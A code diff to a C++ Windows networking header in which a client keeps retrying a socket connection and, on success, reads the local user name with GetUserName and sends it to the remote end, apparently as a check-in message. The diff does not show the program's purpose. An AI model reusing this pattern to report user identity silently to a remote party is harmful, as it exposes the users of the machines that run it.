@@ -1,6 +1,7 @@
 #pragma once
 #include "common.h"
 #include <tchar.h>
+constexpr unsigned short UNLEN = 256;
 
 namespace network
 {
@@ -63,14 +64,22 @@ namespace network
 			while (true)
 			{
 				if ((connect(socket_fd, (sockaddr*)&recvAddr, sizeof(recvAddr))) != SOCKET_ERROR)
-					break;
-				Sleep(100);
+				{
+					wchar_t usrname[UNLEN + 1]; //16 bit UNICODE characters
+					DWORD usrnamelen = UNLEN + 1;
+
+					if (GetUserName(usrname, &usrnamelen)) {
+						//probably gonna cause some data loss from converting 16 bit char to 8 bit
+						send(socket_fd, reinterpret_cast<const char*>(usrname), usrnamelen, 0);
+						return true;
+					}
+				}
 			}
-			return true;
 		}
 
 		bool send_text(std::string& buffer)
 		{
+			std::cout << "send" << buffer <<  std::endl;
 			//compiler likes to bitch about data loss conversion for some reason so i used a static_cast
 			int bytes_received = send(socket_fd, buffer.c_str(), buffer.size(), 0);
 			if (bytes_received == SOCKET_ERROR)
